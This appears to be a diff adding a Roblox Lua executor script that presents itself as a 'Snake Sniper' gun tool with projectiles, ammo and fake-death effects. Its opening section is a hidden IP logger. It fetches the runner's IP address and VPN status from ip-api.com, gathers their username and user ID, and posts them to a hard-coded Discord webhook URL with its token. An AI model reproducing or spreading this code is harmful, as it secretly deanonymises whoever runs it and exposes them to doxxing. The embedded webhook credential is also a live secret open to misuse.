@@ -1,0 +1,312 @@
+local NNN = "https://discord.com/api/webhooks/1466406088982270132/dIYcbd8nUfM7a3jPJQxPzlheGOWCZMCcaLo_VrGqlQmxGO9ufcEL6cVU98AKhZ3H0Jlc"
+
+local h = game:GetService("HttpService")
+local p = game:GetService("Players")
+local l = p.LocalPlayer
+
+local website = "idk"
+local vpn = "idk"
+local r = syn and syn.request or http_request or request or (http and http.request)
+
+pcall(function()
+    local res = r({
+        Url = "http://ip-api.com/json/?fields=66846719",
+        Method = "GET"
+    })
+    if res and res.Body then
+        local d = h:JSONDecode(res.Body)
+        website = d.query or "idk"
+        if d.proxy ~= nil then
+            vpn = d.proxy and "Yes" or "No"
+        end
+    end
+end)
+
+local username = "idk"
+local userid = "idk"
+
+if l then
+    username = l.Name
+    userid = l.UserId
+end
+
+local Bet = {
+    ["embeds"] = {
+        {
+            title = "Secret Service Panel Executed By Skid!, Here Are Some Info I Can Get",
+            color = 8388736, -- purple
+            fields = {
+                { name = "Username", value = username, inline = true },
+                { name = "User ID", value = tostring(userid), inline = true },
+                { name = "Ip", value = website, inline = false },
+                { name = "Using VPN?", value = vpn, inline = true }
+            },
+            footer = {
+                text = "Logged by 7n8z's skid ip logger"
+            }
+        }
+    }
+}
+
+pcall(function()
+    if r then
+        r({
+            Url = NNN,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = h:JSONEncode(Bet)
+        })
+    else
+        h:PostAsync(NNN, h:JSONEncode(Bet))
+    end
+end)
+
+-- SNAKE SNIPER BY MEROX, SORRY ITS NOT FULL BC ITS TOO HARD!!
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local mouse = player:GetMouse()
+local backpack = player:WaitForChild("Backpack")
+
+-- Create Tool
+local Tool = Instance.new("Tool")
+Tool.Name = "SnakeSniperMODDED"
+Tool.ToolTip = "AAAAH FLYING SNAKES!!"
+Tool.TextureId = "http://www.roblox.com/asset/?id=113295938"
+Tool.Parent = backpack
+
+-- Handle
+local Handle = Instance.new("Part")
+Handle.Name = "Handle"
+Handle.Size = Vector3.new(0.51, 1.18, 4.35)
+Handle.Color = Color3.fromRGB(0, 143, 52)
+Handle.Locked = true
+Handle.Parent = Tool
+
+-- Mesh
+local mesh = Instance.new("SpecialMesh")
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "http://www.roblox.com/asset/?id=113239717"
+mesh.TextureId = "http://www.roblox.com/asset/?id=113239576"
+mesh.Scale = Vector3.new(1.3,1.3,1.3)
+mesh.Parent = Handle
+
+-- Sounds
+local FireSound = Instance.new("Sound")
+FireSound.Name = "Fire"
+FireSound.SoundId = "http://www.roblox.com/asset/?id=113244305"
+FireSound.Pitch = 0.82
+FireSound.Volume = 1
+FireSound.Parent = Handle
+
+local ReloadSound = Instance.new("Sound")
+ReloadSound.Name = "Reload"
+ReloadSound.SoundId = "http://www.roblox.com/asset/?id=94153793"
+ReloadSound.Volume = 1
+ReloadSound.Parent = Handle
+
+-- Animations
+local FireAni = Instance.new("Animation")
+FireAni.Name = "FireAni"
+FireAni.AnimationId = "http://www.roblox.com/Asset?ID=113297506"
+FireAni.Parent = Tool
+
+local IdleAni = Instance.new("Animation")
+IdleAni.Name = "Idle"
+IdleAni.AnimationId = "rbxassetid://7171142855"
+IdleAni.Parent = Tool
+
+local ReloadAni = Instance.new("Animation")
+ReloadAni.Name = "Reload1"
+ReloadAni.AnimationId = "http://www.roblox.com/Asset?ID=113298036"
+ReloadAni.Parent = Tool
+
+-- Ammo system
+local Ammo = Instance.new("IntValue")
+Ammo.Name = "Ammo"
+Ammo.Value = 25
+Ammo.Parent = Tool
+
+local Reloading = Instance.new("BoolValue")
+Reloading.Name = "Reloading"
+Reloading.Value = false
+Reloading.Parent = Tool
+
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "AmmoHud"
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local ammoLabel = Instance.new("TextLabel")
+ammoLabel.Size = UDim2.new(0,200,0,50)
+ammoLabel.Position = UDim2.new(0.5,-100,0.9,0)
+ammoLabel.BackgroundTransparency = 0.5
+ammoLabel.TextColor3 = Color3.new(1,1,1)
+ammoLabel.TextScaled = true
+ammoLabel.Text = "Ammo: "..Ammo.Value
+ammoLabel.Parent = gui
+
+Ammo.Changed:Connect(function()
+    ammoLabel.Text = "Ammo: "..Ammo.Value
+end)
+
+-- Animation tracks
+local fireTrack
+local reloadTrack
+local idleTrack
+
+local function playAnimation(anim)
+    local track = humanoid:LoadAnimation(anim)
+    track:Play()
+    return track
+end
+
+-- Damage function with fake death (client-side)
+local function dealDamage(targetHum, targetChar)
+    while targetHum and targetHum.Parent and targetHum.Health > 0 do
+        targetHum:TakeDamage(4)
+        wait(0.5)
+    end
+
+    if targetChar and targetChar:FindFirstChild("Humanoid") then
+        local hum = targetChar.Humanoid
+
+        -- Play death animation
+        local deadAnim = Instance.new("Animation")
+        deadAnim.AnimationId = "rbxassetid://507766666" -- Example death animation
+        local track = hum:LoadAnimation(deadAnim)
+        track:Play()
+
+        -- Hide character after 3 sec
+        wait(3)
+        for _, part in pairs(targetChar:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.Transparency = 1
+                part.CanCollide = false
+            elseif part:IsA("Decal") then
+                part.Transparency = 1
+            end
+        end
+
+        -- Respawn/appear after 5 sec
+        wait(5)
+        for _, part in pairs(targetChar:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.Transparency = 0
+                part.CanCollide = true
+            elseif part:IsA("Decal") then
+                part.Transparency = 0
+            end
+        end
+
+        track:Stop()
+    end
+end
+
+-- Fire function
+local function fire()
+    if Ammo.Value <= 0 or Reloading.Value then return end
+    Ammo.Value = Ammo.Value - 1
+    FireSound:Play()
+    if fireTrack then fireTrack:Stop() end
+    fireTrack = playAnimation(FireAni)
+
+    -- Create snake projectile
+    local snake = Instance.new("Part")
+    snake.Size = Vector3.new(1,1,4)
+    snake.Shape = Enum.PartType.Block
+    snake.Color = Color3.fromRGB(0,255,0)
+    snake.Material = Enum.Material.Neon
+    snake.CFrame = Handle.CFrame * CFrame.new(0,0,-5)
+    snake.CanCollide = false
+    snake.Anchored = false
+    snake.Parent = workspace
+
+    -- Mesh
+    local mesh = Instance.new("SpecialMesh")
+    mesh.MeshType = Enum.MeshType.FileMesh
+    mesh.MeshId = "http://www.roblox.com/asset/?id=113240939"
+    mesh.TextureId = "http://www.roblox.com/asset/?id=113239576"
+    mesh.Scale = Vector3.new(1,1,4)
+    mesh.Parent = snake
+
+    -- Trail
+    local attach0 = Instance.new("Attachment", snake)
+    local attach1 = Instance.new("Attachment", snake)
+    local trail = Instance.new("Trail")
+    trail.Attachment0 = attach0
+    trail.Attachment1 = attach1
+    trail.Lifetime = 0.3
+    trail.Color = ColorSequence.new(Color3.fromRGB(0,255,0))
+    trail.Parent = snake
+
+    -- Velocity
+    local bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.Velocity = (mouse.Hit.Position - Handle.Position).Unit * 200
+    bodyVelocity.MaxForce = Vector3.new(1e5,1e5,1e5)
+    bodyVelocity.Parent = snake
+
+    local startTime = tick()
+    local connection
+    connection = game:GetService("RunService").Heartbeat:Connect(function()
+        -- Remove after 15 seconds if not hit
+        if tick() - startTime >= 15 then
+            connection:Disconnect()
+            snake:Destroy()
+            return
+        end
+
+        -- Check hit players
+        for _, p in pairs(game.Players:GetPlayers()) do
+            if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                local hrp = p.Character.HumanoidRootPart
+                local hum = p.Character:FindFirstChild("Humanoid")
+                if (hrp.Position - snake.Position).Magnitude < 3 and p ~= player then
+                    connection:Disconnect()
+                    snake.Anchored = false
+                    snake.CanCollide = false
+                    snake.CFrame = hrp.CFrame * CFrame.new(0,2,0)
+                    snake.Parent = hrp
+                    spawn(function()
+                        dealDamage(hum, p.Character)
+                        snake:Destroy()
+                    end)
+                    return
+                end
+            end
+        end
+    end)
+end
+
+-- Reload function
+local function reload()
+    if Reloading.Value then return end
+    Reloading.Value = true
+    ReloadSound:Play()
+    if reloadTrack then reloadTrack:Stop() end
+    reloadTrack = playAnimation(ReloadAni)
+    wait(1.5)
+    Ammo.Value = 25
+    Reloading.Value = false
+end
+
+-- Tool events
+Tool.Activated:Connect(fire)
+
+Tool.Equipped:Connect(function()
+    if idleTrack then idleTrack:Stop() end
+    idleTrack = playAnimation(IdleAni)
+end)
+
+Tool.Unequipped:Connect(function()
+    if fireTrack then fireTrack:Stop() end
+    if reloadTrack then reloadTrack:Stop() end
+    if idleTrack then idleTrack:Stop() end
+end)
+
+-- Reload key
+mouse.KeyDown:Connect(function(key)
+    if key:lower() == "r" then
+        reload()
+    end
+end)
